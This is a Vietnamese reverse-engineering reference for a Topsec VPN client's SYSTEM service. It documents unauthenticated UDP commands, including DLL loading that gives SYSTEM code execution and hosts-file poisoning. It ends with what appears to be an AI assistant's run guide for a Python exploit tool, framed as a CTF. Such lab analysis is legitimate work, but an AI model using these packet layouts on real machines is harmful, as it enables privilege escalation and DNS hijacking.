# sv_service.exe — Complete Reverse Engineering Reference

## Binary Info

| Field | Value |
|---|---|
| File | sv_service.exe |
| Arch | x86 (32-bit PE) |
| Service name | TopsecVpnSvc |
| Service user | **SYSTEM** |
| Product | Topsec / NGVONE SSL VPN Client |
| Default install | `C:\Program Files (x86)\NGVONE\Client\` |
| Entry point | `start` → `__tmainCRTStartup` → `wmain` @ **0x462900** |
| Service main | `sub_4653D0` @ **0x4653D0** |
| UDP listener thread | `StartAddress` @ **0x462EB0** |

---

## Protocol

| Field | Value |
|---|---|
| Transport | UDP |
| Bind address | `127.0.0.1:4499` (0x1193) |
| Packet size | 4096 bytes cố định |
| Authentication | **KHÔNG CÓ — hoàn toàn unauthenticated** |
| Dispatcher | `buf[0]` = command byte |
| Threading | Single-threaded `recvfrom` loop trong `StartAddress` |

### Packet layout

```
Offset  Size   Dùng cho
------  -----  ---------
  [0]     1    Command byte
  [1]     1    Sub-param (log level cho cmd 0x17)
[4..283]  280  String/path argument (MBCS, null-terminated)
 [264]    1    Session ID flag (cmd 0x01/0x02/0x03)
[284..287] 4   DWORD: data length
[288..291] 4   DWORD: trigger flag (cmd 0x05) hoặc init() arg (cmd 0x04)
 [296+]   -    DNS entries data (cmd 0x05)
 [548]    1    Sub-flag (cmd 0x04)
 [552+]   -    Extra base64 arg (cmd 0x04)
```

---

## Các hàm quan trọng

| Địa chỉ | Tên | Mô tả |
|---------|-----|-------|
| **0x462EB0** | `StartAddress` | UDP listener thread — dispatcher chính |
| **0x462490** | `sub_462490` | Code signing check (CryptQueryObject) |
| **0x4616B0** | `sub_4616B0` | Start process dùng token của Explorer |
| **0x4625C0** | `sub_4625C0` | Start process dùng token của SYSTEM (WinLogon path) |
| **0x462D80** | `sub_462D80` | Đọc/ghi `HKLM\Software\TopSec\SVClientForNG\SrvRunFlag` |
| **0x460670** | `sub_460670` | Lấy install directory |
| **0x460730** | `sub_460730` | Load `sv_shm.dll`, gọi `SHMEM_SetRunTimeSHMMStatus` |
| **0x461010** | `sub_461010` | **Kill** process theo tên (CreateToolhelp32Snapshot + TerminateProcess) |
| **0x465BF0** | `sub_465BF0` | Base64 encode |
| **0x465D40** | `sub_465D40` | Base64 decode |
| **0x45E4E0** | `sub_45E4E0` | Lấy mainboard serial number |
| **0x465DE0** | `sub_465DE0` | Check session type (winlogon = 1, explorer = other) |
| **0x465E30** | `sub_465E30` | Thread: reset VPN virtual NIC (instdrv.exe disable/enable) |
| **0x4610D0** | `sub_4610D0` | Lấy PID của explorer.exe |

---

## sub_462490 — Code Signing Check (chi tiết)

**Địa chỉ:** `0x462490`  
**Gọi bởi:** `sub_4616B0`, `sub_4625C0` trước khi chạy bất kỳ process nào

```c
// 0x4624aa: kiểm tra OS version
if (GetVersion() < 6) {
    // XP / Server 2003 → bỏ qua kiểm tra, trả 1 (pass)
    log("win7"); return 1;
}

// 0x4624cf: lấy IsWow64Process từ kernel32
GetProcAddress(GetModuleHandleW(L"kernel32"), "IsWow64Process");
IsWow64Process(GetCurrentProcess(), &v13);

if (!v13) {
    // 32-bit Windows thuần → bỏ qua kiểm tra
    log("32"); return 1;
}

// 0x462535: Windows 64-bit + process đang chạy WOW64
// → PHẢI kiểm tra chữ ký số của file exe
CryptQueryObject(CERT_QUERY_OBJECT_FILE, pvObject /*=exe path*/,
    CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED, ...
    &phCertStore, &phMsg, NULL);
CryptMsgGetParam(phMsg, CMSG_SIGNER_INFO_PARAM, ...);
// 0x462583: gọi sub_462330 để verify signer
if (signature_valid && sub_462330(issuer, subject) == 0)
    return 1;  // pass
return 0;      // FAIL → exe bị chặn
```

**Kết luận:**
- Windows XP / 32-bit: **luôn bypass** → cmd 0x01/0x02/0x03 hoạt động với bất kỳ exe nào
- Windows 64-bit: **phải có chữ ký số hợp lệ** → exe tùy ý bị chặn

---

## sub_4616B0 — StartProcess via Explorer Token

**Địa chỉ:** `0x4616B0`  
**Dùng bởi:** cmd `0x01` (fallback), cmd `0x02`

```
0x4616CE  TokenInformation = ArgList (SessionID)
0x4617C9  sub_4610D0()          → lấy PID của explorer.exe
0x4617E3  OpenProcess(PROCESS_ALL_ACCESS, explorer_pid)
0x461814  OpenProcessToken(explorer_handle, TOKEN_ALL_ACCESS, &TokenHandle)
          [setup ACL cho token — BuildExplicitAccessWithNameW("Everyone"), SetEntriesInAcl, ...]
0x461B89  DuplicateTokenEx(TokenHandle, MAXIMUM_ALLOWED, ..., TokenPrimary, &phNewToken)
0x461BB5  SetTokenInformation(phNewToken, TokenSessionId, &SessionID, 4)
0x461C18  CreateEnvironmentBlock(&Environment, phNewToken, FALSE)
0x461D02  CreateProcessAsUserW(phNewToken, lpExePath, NULL, ..., &StartupInfo, &ProcessInfo)
```

**Ý nghĩa:** Process chạy với identity của **Explorer** (user đang đăng nhập), trên desktop `WinSta0\Default`.  
Nếu sig check (sub_462490) thất bại: gọi `sub_460730` → load `sv_shm.dll` → `SHMEM_SetRunTimeSHMMStatus`.

---

## sub_4625C0 — StartProcess via WinLogon/SYSTEM Token

**Địa chỉ:** `0x4625C0`  
**Dùng bởi:** cmd `0x01` (nếu sub_465DE0()==1), cmd `0x03`

```
0x4625DB  TokenInformation = ArgList (SessionID)
0x4626D7  GetCurrentProcess()          → process handle của sv_service.exe (SYSTEM)
0x4626EE  OpenProcessToken(self, TOKEN_ALL_ACCESS, &TokenHandle)
0x46273B  DuplicateTokenEx(TokenHandle, MAXIMUM_ALLOWED, ..., TokenPrimary, &phNewToken)
0x46277A  SetTokenInformation(phNewToken, TokenSessionId, &SessionID, 4)
0x4627E7  CreateEnvironmentBlock(&Environment, phNewToken, FALSE)
0x46283A  CreateProcessAsUserW(phNewToken, pvObject, NULL, ..., &StartupInfo, &ProcessInfo)
```

**Ý nghĩa:** Process chạy với **token của SYSTEM** nhưng được inject vào session của user.

---

## sub_462D80 — SrvRunFlag

**Địa chỉ:** `0x462D80`  
**Gọi bởi:** cmd `0x0F` với arg=1, cmd `0x10` với arg=0

```c
// 0x462DCF
RegOpenKeyW(HKEY_LOCAL_MACHINE,
    L"Software\\TopSec\\SVClientForNG", &phkResult);

if (arg == 1) {                          // cmd 0x0F
    // 0x462E11
    if (RegQueryValueExW(key, L"SrvRunFlag", ...) != 0) {
        // value không tồn tại → tạo mới
        wcscpy_s(Data, L"y");
        RegSetValueExW(key, L"SrvRunFlag", 0, REG_SZ, Data, wcslen(Data));
    }
    // Đánh dấu service đang chạy
} else {                                 // cmd 0x10
    // 0x462E79
    RegDeleteValueW(key, L"SrvRunFlag"); // Xóa flag
}
```

---

## sub_465E30 — VPN NIC Reset Thread

**Địa chỉ:** `0x465E30`  
**Gọi bởi:** cmd `0x1C` → `_beginthread(sub_465E30, 0, NULL)`

```
0x465E54  Sleep(1000)
0x465E7D  SHMEM_GetRunTimeSHMMStatus()
0x465E8A  sub_45DEA0(L"NA_CLIENT.EXE")     → check process
0x465EA5  sub_466240(v8, ...)               → get VPN connection status
          if (status != 1 || v8[2] == 2) → exit (không cần reset)

          // Nếu kết nối có vấn đề:
0x465EC8  loop tối đa 3 lần: sub_466080()  → thử reconnect
          if vẫn lỗi sau 3 lần:

0x465EFD  WinExec("TASKKILL /F /IM na_client.exe /T", 0)
0x465FB1  sprintf(cmd, "%s\\instdrv.exe disable *TOPSEC_VNIC", sysdir)
          sub_4604D0(cmd)                  → chạy instdrv.exe, disable VPN NIC
0x466012  sprintf(cmd, "%s\\instdrv.exe enable *TOPSEC_VNIC", sysdir)
          sub_4604D0(cmd)                  → re-enable VPN NIC
```

**Ý nghĩa:** Reset virtual network adapter của VPN (TOPSEC_VNIC) khi phát hiện kết nối bị lỗi.

---

## sub_461010 — Kill Process by Name

**Địa chỉ:** `0x461010`  
**Gọi bởi:** cmd `0x18` với `L"TopSap.exe"`, sub_4616B0 với `L"TopSap.exe"`

```c
// 0x461031
Toolhelp32Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
pe.dwSize = 556;
Process32FirstW(snapshot, &pe);
do {
    // 0x46107D
    if (StrCmpNIW(psz1, pe.szExeFile, wcslen(psz1)) == 0) {
        // 0x461090
        h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
        if (h) TerminateProcess(h, 0);   // KILL process
    }
} while (Process32NextW(snapshot, &pe));
return 0;  // luôn trả 0
```

> **Chú ý:** Hàm này KILL process, không phải chỉ "check". Luôn return 0.

---

---

# Chi tiết từng Command

---

## CMD 0x04 — DLL Injection / RCE as SYSTEM ⚠️ CRITICAL

**Dispatcher:** while-loop trong `StartAddress` @ **0x4636B6** (break when `buf[0] != 4`)  
**Handler bắt đầu:** `0x4636C7`

```
0x4636C7  memset(v127, 0, 4096)           → output buffer
0x4636DB  LibFileName = 0 + memset        → DLL path buffer
0x463702  log buf[548], buf[284], buf[552]
0x46373A  sub_465D40(*DWORD@buf[284])     → base64 decode arg
0x463763  sub_460670(&LibFileName)         → lấy install dir
          if (install_dir rỗng):
0x463790    GetModuleFileNameW → lấy path của sv_service.exe
0x4637B7    _wsplitpath_s → lấy drive + dir
0x4637CF    wcscpy_s + wcscat_s → dùng dir của exe làm install dir

          // Tìm vị trí null cuối LibFileName
0x4637F8  v26 = &buf[4094]
          do { v27 = *(WORD*)(v26+2); v26 += 2; } while(v27)
0x46381C  qmemcpy(v26, L"\\secChecker.dll", 0x20)
          // → LibFileName = install_dir\secChecker.dll

0x46381F  v28 = LoadLibraryW(&LibFileName) → load DLL
0x46383B  init = GetProcAddress(v28, "init")
0x46384C  init(&buf[288])                  → gọi init() với arg từ packet
          if (init() == TRUE):
0x46385B    operator new(8)
0x463874    checkAllSecurity = GetProcAddress(v29, "checkAllSecurity")
0x46387F    v33 = checkAllSecurity(v127)   → gọi, output vào v127
0x463893    v34 = sub_465BF0(*v33 - 4)    → base64 encode, length = *(ptr-4)
0x4638C3    sendto(s, v131/*b64 result*/, v34, 0, &from, 16)
```

**Input packet:**
```
buf[0]       = 0x04
buf[288]     = argument cho init() — để 0 là OK
(còn lại = 0)
```

**Điều kiện:**
- `{install_dir}\secChecker.dll` phải tồn tại
- DLL export: `BOOL __cdecl init(char*)` và `DWORD* __cdecl checkAllSecurity(unsigned char*)`
- `checkAllSecurity` return `&g_size` trong đó `g_size-4` = số byte cần gửi

**Output:** Base64-encoded bytes từ `checkAllSecurity()`

**Nguy hiểm:** Thực thi code tùy ý với quyền **SYSTEM**, không cần auth, chỉ cần localhost UDP.

---

## CMD 0x05 — Ghi hosts file (DNS Poisoning)

**Dispatcher:** while-loop trong `StartAddress`  
**Handler bắt đầu:** `0x463049`

```
0x4630AD  if (*DWORD@buf[288] != 1) goto LABEL_43    → phải có trigger flag
0x4630BA  if (*DWORD@buf[284] == 0) → log error, skip  → phải có data length

0x4630D2  GetSystemDirectoryW(&Buffer)
          sub_466520(&Buffer)  × 2                   → normalize path
          sub_466570(L"\\drivers\\etc\\hosts")       → hosts path
          sub_466570(L"\\drivers\\etc\\hosts.bak")  → backup path
0x463158  CopyFileW(hosts → hosts.bak)               → tạo backup

          // Đọc hosts hiện tại
0x4631B4  _wsopen_s(&FileHandle, hosts_path, O_RDONLY|O_TEXT)
0x4631CA  v9 = _filelength(FileHandle)
0x4631EB  operator new[](v9)
0x4631FD  _read(FileHandle, buf, v9)

          // Tìm marker cũ
0x46321C  v13 = strstr(content, "#Add by VONE SSL VPN Client")
          if (!v13):
              // Chưa có → APPEND vào cuối
0x46324E    CreateFileW(hosts, GENERIC_WRITE, ...)
0x463279    SetFilePointer(file, 0, 0, FILE_END)
            WriteFile(file, "\r\n####...#Add by VONE SSL VPN Client\r\n")
0x46331A    WriteFile(file, &buf[296], *DWORD@buf[284])  → ghi entries
            WriteFile(file, "\r\n#End of VONE SSL VPN Add\r\n####...\r\n")
          else:
              // Có rồi → REPLACE block cũ
0x463387    v17 = v13 + 27  → sau marker
0x463392    lpBuffer = strstr(content, "#End of VONE SSL VPN Add")
0x4633BE    CreateFileW(hosts, GENERIC_WRITE, ..., TRUNCATE_EXISTING)
            WriteFile(file, content, v17 - content)     → phần trước marker
            WriteFile(file, "\r\n")
0x463446    WriteFile(file, &buf[296], *DWORD@buf[284]) → entries mới
            WriteFile(file, lpBuffer, ...)               → phần sau
```

**Input packet:**
```
buf[0]       = 0x05
buf[284:288] = DWORD: số byte entries (ví dụ: 20)
buf[288:292] = DWORD: 1  ← bắt buộc
buf[296:]    = DNS entries, ví dụ: "1.2.3.4 evil.com\r\n"
```

---

## CMD 0x06 — Restore hosts file

**Handler:** `0x46350B`

```
0x463578  GetSystemDirectoryW(&Buffer)
          [tạo path hosts và hosts.bak]
0x4635F6  CopyFileW(hosts.bak → hosts)
0x463622  _wremove(hosts.bak)         → xóa backup
```

---

## CMD 0x07 — Heartbeat / Ping

**Handler:** `0x463AF2`

```
0x463AF2  memset(v131, 0, 4096)
0x463AFA  v131[0] = 8        → byte đầu tiên của response
0x463B25  sendto(s, v131, 284, 0, &from, 16)
```

**Output:** 284 bytes, `byte[0] = 0x08`

---

## CMD 0x09 / 0x0A / 0x0B / 0x0C / 0x0D — Get Install Directory

**Cases:** 9, 10, 11, 12, 13 — tất cả chạy cùng code  
**Handler:** `0x464BDA`

```
0x464BDA  memset(&Buffer, 0, ...)
0x464BFE  memset(v118, 0, 0x104)        → output buffer
0x464C3C  sub_460670(&Buffer)           → lấy install dir (UTF-16LE)
0x464C41  v87 = wcslen(&Buffer)
          // convert UTF-16LE → MBCS
0x464C87  v88 = sub_45A260(..., &Buffer, ...)
0x464C89  v91 = strlen(v88)
          // copy vào output
0x464CE2  memmove_0(v118, &Buffer_wide, v91)
0x464D14  sendto(s, v118, 260, 0, &from, 16)
```

**Output:** 260 bytes, install dir dưới dạng MBCS  
**Ví dụ:** `C:\Program Files (x86)\NGVONE\Client\`

---

## CMD 0x0F — Set SrvRunFlag = "y"

**Handler:** `0x463B55`

```
0x463B62  sub_462D80(1)
```

Gọi `sub_462D80` với arg=1 → `HKLM\Software\TopSec\SVClientForNG\SrvRunFlag = L"y"`  
Đánh dấu service đang running trong shared state.

---

## CMD 0x10 — Delete SrvRunFlag + cleanup logs

**Handler:** `0x463B7A`

```
0x463B84  sub_462D80(0)              → xóa SrvRunFlag
0x463BB2  sub_460670(&Buffer)        → lấy install dir
0x463BC8  wcscat_s(&Buffer, L"\\")
0x463BE1  wcscat_s(&Buffer, L"srv.cfg")
0x463BF0  DeleteFileW(&Buffer)       → xóa install_dir\srv.cfg

0x463C0B  SHGetSpecialFolderLocation(0, CSIDL_PROFILE, &ppidl)
0x463C1E  SHGetPathFromIDListW(ppidl, &LibFileName)  → user home dir
          if (GetVersion() < 6):  // XP
              wcscat_s(path, L"\\")
          else:
              wcscat_s(path, L"\\AppData\\LocalLow\\")
0x463C67  wcscat_s(path, L"SV_Client.log")
          wcscat_s(install, L"srv.log")
0x463CC1  CopyFileW(SV_Client.log → install_dir\srv.log)
```

---

## CMD 0x11 — Copy arbitrary file → srv.cfg

**Handler:** `0x463CDA`

```
0x463CF7  memmove_0(&MultiByteStr, &buf[288], *DWORD@buf[284])
          // MultiByteStr = file path lấy từ packet (MBCS)

0x463D44  sub_460670(&Buffer)              → install dir
0x463D5A  wcscat_s(&Buffer, L"\\")
0x463D73  wcscat_s(&Buffer, L"srv.cfg")   → destination

0x463D8D  v41 = strlen(&MultiByteStr) + 1
          // convert MBCS → UTF-16LE
0x463DAF  v42 = sub_45FE50(..., &MultiByteStr, v41, CP_ACP)

0x463DBE  CopyFileW(v42 /*src path từ packet*/, &Buffer /*install\srv.cfg*/, FALSE)
```

**Input packet:**
```
buf[0]       = 0x11
buf[284:288] = DWORD: strlen(src_path) + 1
buf[288:]    = source file path (MBCS, null-terminated)
```

**Nguy hiểm:** Có thể ghi đè config VPN bằng file tùy ý trên máy.

---

## CMD 0x12 — Close SVClient window

**Handler:** `0x463DDD`

```
0x463DEC  WindowW = FindWindowW(NULL, L"SVClient")
          if (WindowW):
0x463DFC    lParam[0] = 255; lParam[1] = 0; lParam[2] = 0
0x463E23    SendMessageW(hwnd, 0x4A, 0xFF, (LPARAM)lParam)
            // Message 0x4A = custom VPN client shutdown message

0x463E2C  for (i = 0; i < 120; i++):     // chờ tối đa 60 giây
0x463E3C    h = OpenMutexW(MUTEX_ALL_ACCESS, 0, L"Global\\MUTEX_VONE_NA_FOR_NG")
            if (!h) break                  // mutex released → done
            CloseHandle(h)
0x463E52    Sleep(500)

0x463E80  v131[0] = 0x13
0x463EA5  sendto(s, v131, 284, 0, &from, 16)
```

**Output:** 284 bytes, `byte[0] = 0x13`

---

## CMD 0x16 — Mainboard Serial Hash

**Handler:** `0x4639FD`

```
0x4639FD  memset(v131, 0, 4096)
0x463A05  [init string buffer]
0x463A2D  sub_45E4E0(v103[0], v103[1])   → lấy mainboard serial
          if (!fail):
              strcpy(v131, serial_base64_md5)
0x463AA1  sendto(s, v131, strlen(v131), 0, &from, 16)
```

**Output:** Base64(MD5(mainboard serial)) — dùng để fingerprint máy victim.

---

## CMD 0x17 — Set Log Level

**Handler:** `0x463F0F`

```
0x463F14  v48 = (uint8_t)buf[1]          → level từ packet
0x463F2A  SetLogLevel(v48)               → set @ 0x483340
0x463F3A  GetLogLevel(v109)              → đọc lại @ 0x48333C
0x463F62  if (v48 == *DWORD@v109):
              sprintf(v131, "%d", 0)     → "0" = OK
          else:
              sprintf(v131, "%d", -1)    → "-1" = FAIL
0x463FC0  sendto(s, v131, strlen(v131), ...)
```

---

## CMD 0x18 — Kill TopSap.exe

**Handler:** `0x46402D`

> **Chú ý:** Tên misleading — hàm này KILL TopSap.exe, không chỉ "check".

```
0x464047  sub_461010(L"TopSap.exe")
          // sub_461010 @ 0x461010:
          //   CreateToolhelp32Snapshot → iterate processes
          //   StrCmpNIW(L"TopSap.exe", pe.szExeFile)
          //   → OpenProcess(PROCESS_TERMINATE) + TerminateProcess
          //   luôn return 0

0x464062  if (sub_461010(...)):          // luôn false vì return 0
              sprintf(v131, "%d", -1)
          else:
              sprintf(v131, "%d", 0)     // → luôn gửi "0"
0x4640AD  sendto(...)
```

**Output:** Luôn là `"0"` (dù process có bị kill hay không).

---

## CMD 0x19 — Read/Write HKLM\SOFTWARE\Topsec\FilePath

**Handler:** `0x4640F6`

```
0x4640F6  memset(v131, 0, 4096)
0x46410C  sprintf(v131, "%d", -1)        → khởi tạo "-1"
0x464123  Buffer = 0; cbData = 260

0x46415A  v51 = RegOpenKeyW(HKEY_LOCAL_MACHINE,
                            L"SOFTWARE\\Topsec",    // WOW64 → WOW6432Node\Topsec
                            &phkResult)
          if (v51 != 0):
0x46420F    log("RegOpenKey Failed error[%d]", v51)
            // FALL THROUGH (không return!)
          else:
              // Đọc giá trị cũ
0x46418A    v52 = RegQueryValueExW(phkResult, L"FilePath", 0,
                                   &Type, (BYTE*)&Buffer, &cbData)
0x464192    if (v52): log("RegQueryValueEx Failed")
            else:     log("RegQueryValueEx FilePath = %s", Buffer)

              // Ghi giá trị mới từ packet
0x4641E3    v53 = RegSetValueExW(phkResult, L"FilePath", 0,
                                  REG_SZ,               // BUG: phải UTF-16, nhưng truyền MBCS
                                  (BYTE*)&buf[4],        // attacker-controlled
                                  strlen(&buf[4]) + 1)
0x4641EB    if (v53):
                log("RegSetValue Failed"); RegCloseKey(phkResult)

// Luôn chạy (kể cả khi open fail):
0x46421C  log("RegSetValue Success")
0x464232  sprintf(v131, "%d", 0)         → override thành "0"
0x464240  RegCloseKey(phkResult)         // BUG: double-close nếu v53 != 0
0x46427A  sendto(s, v131, strlen(v131), ...)
```

**Input:**
```
buf[0]  = 0x19
buf[4:] = giá trị mới (MBCS, null-terminated)
```

**Điều kiện:** `HKLM\SOFTWARE\WOW6432Node\Topsec` phải tồn tại  
```cmd
reg add "HKLM\SOFTWARE\WOW6432Node\Topsec" /f
```

**Bug:** `RegSetValueExW` với `REG_SZ` nhưng data là raw MBCS bytes → encoding sai.  
**Bug:** `RegCloseKey` gọi 2 lần khi SetValue thất bại → undefined behavior với handle không hợp lệ.  
**Output:** Luôn là `"0"` (kể cả khi open thất bại).

---

## CMD 0x1A — Set HKCR\.css Content Type

**Handler:** `0x4642D4`

```
0x464310  v57 = RegOpenKeyW(HKEY_CLASSES_ROOT, L".css", &hKey)
          if (v57):
0x46435B    log("RegOpenKey Failed")
          else:
0x46432F    v58 = RegSetValueExW(hKey, L"Content Type", 0,
                                  REG_SZ, L"text/css", 0x10)
0x464337    if (v58): log("RegSetValue Failed"); RegCloseKey(hKey)
0x464368  log("RegSetValue Success")
0x46437E  sprintf(v131, "%d", 0)
0x46438C  RegCloseKey(hKey)
0x4643CA  sendto(...)
```

---

## CMD 0x1B — Kill na_client.exe

**Handler:** `0x463FFC`

```
0x46400B  WinExec("TASKKILL /F /IM na_client.exe /T", SW_HIDE)
```

---

## CMD 0x1C — Spawn VPN NIC Reset Thread

**Handler:** `0x4643EA`

```
0x4643EA  _beginthread(sub_465E30, 0, NULL)
```

Spawn `sub_465E30` @ `0x465E30` (xem chi tiết ở trên).  
Thread sẽ: check NA_CLIENT.EXE → nếu VPN bị lỗi: kill na_client + `instdrv.exe disable/enable *TOPSEC_VNIC`.

---

## CMD 0x1D — Reset Log Files

**Handler:** `0x464405`

```
0x464470  GetSystemDirectoryA(Buffer)   → ví dụ "C:\Windows\System32"

0x4644A6  snprintf(path, "%s\\%s.log", sysdir, "TopsecVpnSvc")
0x4644BA  v59 = fopen(path, "wb+")      → truncate/create
0x4644D2  fwrite("[New Log]\n", 12, 1, v59)
          fclose(v59)

0x464511  snprintf(path, "%s\\%s.log", sysdir, "TopsecVpnClient")
0x464525  v61 = fopen(path, "wb+")      → truncate/create
0x46453D  fwrite("[New Log]\n", 12, 1, v61)
          fclose(v61)

0x464571  snprintf(bak, "%s.bak", path)
0x46457D  remove(bak)                   → xóa TopsecVpnClient.log.bak
```

---

## CMD 0x01 — Start process (buf[4] có nội dung)

**Handler:** `0x4649B4` (sau khi break ra khỏi while loop, `if strlen(&buf[4])`, `case 1`)

```
0x4649B4  v75 = MultiByteToWideChar(CP_ACP, 0, &buf[4], -1, 0, 0)
0x4649DF  MultiByteToWideChar(CP_ACP, 0, &buf[4], -1, WideCharStr, v75)
          // WideCharStr = wide version của exe path

0x4649E9  if (sub_465DE0() == 1):   // session là winlogon?
0x4649F7    sub_4625C0(buf[264], WideCharStr)   // SYSTEM token path
          else:
              // Tạo path: install_dir\na_client.exe
0x464A40    sub_460370(v130)         → lấy app dir
0x464A5D    wsprintfW(v129, L"%s%s", v130, L"na_client.exe")
0x464A72    sub_4616B0(buf[264], v129)           // Explorer token path
```

---

## CMD 0x02 — Start process via Explorer (buf[4] có nội dung)

**Handler:** `0x464901`

```
0x464901  MultiByteToWideChar(... &buf[4] → WideCharStr)
0x46493A  sub_4616B0(buf[264], WideCharStr)    // Explorer token @ 0x4616B0
```

---

## CMD 0x03 — Start process via WinLogon (buf[4] có nội dung)

**Handler:** `0x4647AC`

```
0x4647AC  MultiByteToWideChar(... &buf[4] → WideCharStr)
0x4647E1  if (sub_465DE0() == 1):
0x4647EF    sub_4625C0(buf[264], WideCharStr)  // SYSTEM token @ 0x4625C0
          else:
              sub_4616B0(buf[264], path_na_client) // Explorer token
```

---

## CMD 0x00 — Start IV processes (buf[4] rỗng)

**Handler:** `0x464655` + `0x4646AC` (sau `if sub_4615F0(Destination)`, `buf[0] == 0`)

```
0x464655  // buf[0] == 1 → Start SV
          wcscpy_s(WideCharStr, Destination)
          wcscat_s(WideCharStr, L"AxService.exe")
          sub_4625C0(buf[264], WideCharStr)

0x4646AC  // buf[0] == 0 → Start IV
          wcscpy_s(WideCharStr, Destination)
          wcscat_s(WideCharStr, L"SecPkgCpl.exe")
          sub_4625C0(buf[264], WideCharStr)   // launch SecPkgCpl.exe
          wcscpy_s(WideCharStr, Destination)
          wcscat_s(WideCharStr, L"LoadCert.exe")
          sub_4616B0(buf[264], WideCharStr)   // launch LoadCert.exe
```

---

## CMD 0x14 — Launch IE/browser with param

**Handler:** `0x464A95`

```
0x464A95  log("ITEM_TYPE_CUSTOM_IE_WITH_PARAM")
0x464AB4  MultiByteToWideChar(... &buf[4] → WideCharStr)   // exe path
0x464ADE  MultiByteToWideChar(... &buf[284] → CommandLine) // cmd line param
0x464BB5  sub_461D40(buf[264], WideCharStr, CommandLine)   // launch với params
```

---

## Tổng hợp attack surface

| Lỗ hổng | Cmd (hex) | Handler addr | Impact |
|---------|-----------|-------------|--------|
| **RCE as SYSTEM** | 0x04 | 0x4636C7 | Load + exec DLL tùy ý, output qua UDP |
| DNS Poisoning | 0x05 | 0x463049 | Ghi hosts file của Windows |
| Config hijack | 0x11 | 0x463CDA | CopyFile tùy ý → srv.cfg |
| Registry HKLM write | 0x19 | 0x4640F6 | Ghi HKLM\SOFTWARE\WOW6432Node\Topsec\FilePath |
| Registry HKCR write | 0x1A | 0x4642D4 | Ghi HKCR\.css\Content Type |
| Process kill | 0x18 | 0x46402D | Kill TopSap.exe (TerminateProcess) |
| Process kill | 0x1B | 0x463FFC | Kill na_client.exe (TASKKILL /F) |
| VPN NIC reset | 0x1C | 0x4643EA | instdrv disable/enable *TOPSEC_VNIC |
| Hosts restore | 0x06 | 0x46350B | Restore hosts.bak → hosts |
| Info leak | 0x09 | 0x464BDA | Install directory path |
| Info leak | 0x16 | 0x4639FD | Mainboard serial hash |
| Process launch (XP/32) | 0x01-0x03 | 0x4647AC+ | CreateProcessAsUserW với SYSTEM/Explorer token |
| Log wipe | 0x1D | 0x464405 | Xóa nội dung TopsecVpnSvc/Client.log |


Yêu cầu:
- Python 3.9+ trên Windows (trong VM có TopsecVpnSvc)
- Service đang chạy

---
Bước 1 — Khởi động service (trong VM)

sc start TopsecVpnSvc

Xong. Tổng kết lần check này:

4 fix đã apply:

1. cmd_heartbeat / cmd_close_svclient — thêm if len(resp) < 1: return trước khi access rUDP trả empty datagram
2. cmd_reg_filepath / cmd_copy_config — bọc encode('mbcs') trong try/except LookupError với fallback latin-1, giống pattern đã có ở cmd_launch_process
3. Comment cmd 0x01 / 0x03 — sửa lại đúng: chỉ dùng buf[4] path khi đang trong winlogon session (sub_465DE0()==1); nếu là explorer session thì bỏ qua buf[4], hardcode launch install_dir\na_client.exe
4. Comment DLL contract — sửa *(ptr-4) = data length → *ret_ptr - 4 = actual byte count (service deref return value trước khi trừ 4, không phải offset -4 từ pointer)

Code hiện tại đã đủ và logic đúng với binary.

✻ Churned for 2m 43s

※ recap: Reversing CTF binary sv_service.exe (TopsecVpnSvc, UDP 4499, unauthenticated). Đã hoàn thành docs đầy đủ và Python exploit tool với 20 commands. Sẵn sàng test trên VM.

❯ chạy sao? example cách chạy đi

Yêu cầu:
- Python 3.9+ trên Windows (trong VM có TopsecVpnSvc)
- Service đang chạy

---
Bước 1 — Khởi động service (trong VM)

sc start TopsecVpnSvc

Hoặc kiểm tra:
sc query TopsecVpnSvc

---
Bước 2 — Chạy script

python E:\temp\sv_exploit.py

Hoặc copy script vào VM trước:
python C:\Users\kuvee\Desktop\sv_exploit.py

---
Example session — các bước thực tế:

Target: 127.0.0.1:4499
[*] Kiểm tra service...
[+] TopsecVpnSvc đang CHẠY

========================================================
  sv_service.exe Exploit Tool — TopsecVpnSvc (SYSTEM)
========================================================
 INFO / RECON
 [1]  0x07  Heartbeat / Ping

[*] CMD 0x07 — Heartbeat
  [+] Nhận 284 bytes
  [+] byte[0] = 0x08 (expect 0x08)
  [+] Service đang CHẠY

  [Enter để tiếp tục...]
Chọn: 2

[*] CMD 0x09 — Get Install Directory
  [+] Nhận 260 bytes
  [+] Install dir: 'C:\\Program Files (x86)\\NGVONE\\Client\\'

  [Enter để tiếp tục...]
Chọn: 17

[*] CMD 0x04 — DLL Injection (RCE as SYSTEM)
  [!] Service tự build path: install_dir\secChecker.dll
  [!] KHÔNG nhận path DLL từ packet — phải đặt DLL đúng chỗ trước

  Argument cho init() [Enter = rỗng]:
  [*] Gửi packet...
  [+] Raw response (88 bytes raw): b'AAAAAE5PX0ZMQUdf...'
  [+] Base64 decoded (64 bytes):
  [+] Content: 'NO_FLAG_FOUND | user=SYSTEM | pid=1234'

---
Workflow thực tế cho CTF — thứ tự nên chạy:

[1] Ping trước — xác nhận service alive
[2] Get install dir — biết đường dẫn để đặt DLL
[3] Serial hash — fingerprint máy
[9] Write registry FilePath — test HKLM write (cần tạo key trước)
[17] DLL inject — RCE as SYSTEM (cần copy secChecker.dll vào install dir)

Setup cho DLL inject (chạy trong VM, cmd as admin):

:: 1. Copy DLL vào install dir
copy E:\temp\secChecker.dll "C:\Program Files (x86)\NGVONE\Client\secChecker.dll"

:: 2. Chạy exploit
python sv_exploit.py
:: Chọn [17]

Setup cho registry write (cmd 0x19):

:: Tạo key trong WOW64 hive (bắt buộc vì service là 32-bit)
reg add "HKLM\SOFTWARE\WOW6432Node\Topsec" /f

:: Chạy exploit
python sv_exploit.py
:: Chọn [9] → nhập giá trị

Copy script nhanh sang VM (nếu dùng shared folder hoặc network):

:: Trong VM PowerShell
python "\\vmware-host\Shared Folders\temp\sv_exploit.py"